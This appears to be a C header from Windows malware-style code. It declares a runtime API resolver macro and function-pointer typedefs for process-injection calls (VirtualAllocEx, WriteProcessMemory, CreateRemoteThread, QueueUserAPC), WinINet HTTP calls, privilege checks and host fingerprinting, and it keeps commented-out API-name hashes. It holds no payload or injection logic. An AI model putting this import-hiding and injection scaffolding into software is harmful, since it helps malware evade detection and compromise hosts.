#pragma once
#include "main.h"

LPVOID GetWinAPI(int dll, LPCSTR funcName);

#define KERNEL32 1
#define USER32 2
#define SHELL32 3
#define OLE32 4
#define WININET 5
#define ADVAPI32 6
#define WTSAPI32 7
#define PSAPI 8

//#define API(DLL, FUNC) ((T_##FUNC)GetWinAPI(DLL, StaticData::##FUNC))
#define API(DLL, FUNC) ((T_##FUNC)GetWinAPI(DLL, C_##FUNC, sizeof(C_##FUNC)-1))

typedef LPVOID HINTERNET;
typedef WORD INTERNET_PORT;

typedef BOOL (WINAPI* T_InternetSetOptionW)(HINTERNET ,DWORD ,LPVOID lpBuffer,DWORD dwBufferLength);
typedef BOOL (WINAPI* T_InternetQueryDataAvailable)(HINTERNET hFile, LPDWORD, DWORD, DWORD_PTR);

//typedef NTSTATUS (WINAPI* NtClose_)(HANDLE);
typedef PVOID (WINAPI* RtlAllocateHeap_)(PVOID  HeapHandle,ULONG  Flags,SIZE_T Size);
typedef BOOL (WINAPI* RtlFreeHeap_)(PVOID HeapHandle,ULONG Flags OPTIONAL,PVOID BaseAddress);

typedef BOOL (WINAPI* T_GetComputerNameExW)(COMPUTER_NAME_FORMAT NameType,LPWSTR lpBuffer,LPDWORD nSize);
typedef PVOID (WINAPI* T_FreeSid)(PSID pSid);
typedef DWORD (WINAPI* T_GetCurrentDirectoryA)(DWORD nBufferLength,LPSTR lpBuffer);
typedef DWORD(WINAPI* T_GetCurrentProcessId)();
//typedef DWORD (WINAPI* T_GetProcessId)(HANDLE Process);;
typedef HMODULE(WINAPI* T_LoadLibraryA)(PCHAR);
typedef BOOL (WINAPI* T_GetTokenInformation)(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,LPVOID TokenInformation,DWORD TokenInformationLength,PDWORD ReturnLength);
typedef BOOL (WINAPI* T_DuplicateToken)(HANDLE  ExistingTokenHandle,SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,PHANDLE DuplicateTokenHandle);
typedef BOOL (WINAPI* T_CreateWellKnownSid)(WELL_KNOWN_SID_TYPE WellKnownSidType,PSID DomainSid,PSID pSid,DWORD *cbSid);
typedef BOOL (WINAPI* T_CheckTokenMembership)(HANDLE TokenHandle,PSID   SidToCheck,PBOOL  IsMember);
typedef DWORD(WINAPI* T_GetFileAttributesW)(LPCWSTR);
typedef BOOL(WINAPI* T_SetCurrentDirectoryA)(LPCSTR);
typedef BOOL(WINAPI* T_GetVolumeInformationW)(LPCWSTR, LPCWSTR, DWORD, LPDWORD, LPDWORD, LPDWORD, LPCWSTR, DWORD);
typedef BOOL(WINAPI* T_CreateDirectoryW)(LPCWSTR, LPSECURITY_ATTRIBUTES);
typedef HANDLE(WINAPI* T_CreateFileA)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef DWORD(WINAPI* T_GetFileSize)(HANDLE, LPDWORD);

typedef BOOL (WINAPI* T_GetUserNameW)(LPWSTR  lpBuffer,LPDWORD pcbBuffer);
typedef BOOL(WINAPI* T_CloseHandle)(HANDLE);
typedef BOOL(WINAPI* T_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef BOOL(WINAPI* T_DeleteFileA)(LPCSTR lpFileName);
typedef DWORD (WINAPI* T_GetModuleBaseNameA)(HANDLE  hProcess,HMODULE hModule,LPSTR   lpBaseName,DWORD   nSize);
typedef HANDLE (WINAPI* T_CreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL    bInitialOwner,LPCSTR  lpName);
typedef DWORD(WINAPI* T_GetLastError)();
typedef BOOL (WINAPI* T_ReleaseMutex)(HANDLE);
typedef HINTERNET(WINAPI* T_InternetOpenW)(LPCWSTR, DWORD, LPCWSTR, LPCWSTR, DWORD);
typedef HINTERNET(WINAPI* T_InternetConnectW)(HINTERNET, LPCWSTR, INTERNET_PORT, LPCWSTR, LPCWSTR, DWORD, DWORD, DWORD_PTR);
typedef HINTERNET(WINAPI* T_HttpOpenRequestW)(HINTERNET, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR, LPCWSTR*, DWORD, DWORD_PTR);
typedef BOOL(WINAPI* T_InternetCloseHandle)(HINTERNET);
typedef BOOL(WINAPI* T_HttpSendRequestW)(HINTERNET, LPCWSTR, DWORD, LPVOID, DWORD);
typedef BOOL(WINAPI* T_InternetReadFile)(HINTERNET, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* T_IsWow64Process)(HANDLE, PBOOL);
typedef BOOL(WINAPI* T_GetUserNameA)(LPSTR lpBuffer, LPDWORD pcbBuffer);
typedef BOOL (WINAPI* T_GetComputerNameA)(LPSTR lpBuffer, LPDWORD nSize);
typedef HWND(WINAPI* T_GetForegroundWindow)();
typedef INT (WINAPI* T_GetWindowTextA)(HWND, LPSTR, int);
typedef VOID (WINAPI* T_Sleep) (DWORD);
typedef BOOL (WINAPI* T_CreatePipe)(PHANDLE hReadPipe,PHANDLE hWritePipe,LPSECURITY_ATTRIBUTES lpPipeAttributes,DWORD nSize);
typedef BOOL (WINAPI* T_WriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
typedef BOOL (WINAPI* T_SetHandleInformation)(HANDLE hObject,DWORD  dwMask,DWORD  dwFlags);
typedef HMODULE(WINAPI* T_GetModuleHandleA) (LPCSTR);
typedef LPVOID(WINAPI* T_VirtualAlloc) (LPVOID, SIZE_T, DWORD, DWORD);
typedef LPVOID (WINAPI* T_VirtualAllocEx)(HANDLE ,LPVOID,SIZE_T ,DWORD ,DWORD );
typedef BOOL (WINAPI* T_VirtualProtectEx)(HANDLE,LPVOID,SIZE_T,DWORD,PDWORD);
typedef BOOL(WINAPI* T_VirtualFree) (LPVOID, SIZE_T, DWORD);
typedef BOOL (WINAPI* T_WriteProcessMemory)(HANDLE  ,LPVOID  ,LPCVOID ,SIZE_T ,SIZE_T* );
typedef HANDLE(WINAPI* T_CreateThread) (LPSECURITY_ATTRIBUTES, SIZE_T, LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef BOOL (WINAPI* T_CreateProcessA)(LPCSTR lpApplicationName,LPSTR  ,LPSECURITY_ATTRIBUTES,LPSECURITY_ATTRIBUTES ,BOOL ,DWORD ,LPVOID ,LPCSTR ,LPSTARTUPINFOA ,LPPROCESS_INFORMATION );
typedef HANDLE (WINAPI* T_OpenProcess)(DWORD dwDesiredAccess,BOOL  bInheritHandle,DWORD dwProcessId);
typedef BOOL (WINAPI* T_OpenProcessToken)(HANDLE  ProcessHandle,DWORD   DesiredAccess,PHANDLE TokenHandle);
//typedef BOOL (WINAPI* T_Thread32First)(HANDLE  hSnapshot,LPTHREADENTRY32 lpte);
//typedef BOOL (WINAPI* T_Thread32Next)(HANDLE  hSnapshot,LPTHREADENTRY32 lpte);
typedef DWORD (WINAPI* T_QueueUserAPC)(PAPCFUNC pfnAPC, HANDLE hThread, ULONG_PTR dwData);
typedef HANDLE (WINAPI* T_OpenThread)(DWORD dwDesiredAccess,BOOL  bInheritHandle,DWORD dwThreadId);
//typedef BOOL (WINAPI* T_GetThreadContext)(HANDLE ,LPCONTEXT );
//typedef BOOL (WINAPI* T_SetThreadContext)(HANDLE hThread,const CONTEXT *lpContext);
typedef HANDLE (WINAPI* T_CreateRemoteThread)(HANDLE ,LPSECURITY_ATTRIBUTES ,SIZE_T ,LPTHREAD_START_ROUTINE ,LPVOID ,DWORD ,LPDWORD );
typedef DWORD (WINAPI* T_ResumeThread)(HANDLE hThread);
typedef DWORD (WINAPI* T_SuspendThread)(HANDLE hThread);
typedef BOOL (WINAPI* T_ReadProcessMemory)(HANDLE ,LPCVOID ,LPVOID ,SIZE_T ,SIZE_T* );
typedef HANDLE (WINAPI* T_FindFirstFileA)(LPCSTR lpFileName,LPWIN32_FIND_DATAA );
typedef BOOL (WINAPI* T_FindNextFileA)(HANDLE ,LPWIN32_FIND_DATAA );
typedef BOOL (WINAPI* T_FindClose)(HANDLE hFindFile);
typedef BOOL (WINAPI* T_CopyFileA)(LPCSTR ,LPCSTR ,BOOL );
typedef HANDLE (WINAPI* T_CreateToolhelp32Snapshot)(DWORD ,DWORD);
typedef BOOL (WINAPI* T_Process32First)(HANDLE ,LPPROCESSENTRY32 lppe);
typedef BOOL (WINAPI* T_Process32Next)(HANDLE ,LPPROCESSENTRY32 lppe);
//typedef BOOL (WINAPI* T_UnmapViewOfFile)(LPCVOID);
typedef DWORD (WINAPI* T_WaitForSingleObject)(HANDLE hHandle,DWORD  dwMilliseconds);
typedef BOOL (WINAPI* T_EnumProcessModules)(HANDLE  hProcess,HMODULE *lphModule,DWORD   cb,LPDWORD lpcbNeeded);
typedef void (WINAPI* T_ExitProcess)(UINT uExitCode);

//#define hashLoadLibraryA 0x0aadf0f1
//#define hashGetProcAddress 0x0b3c1d03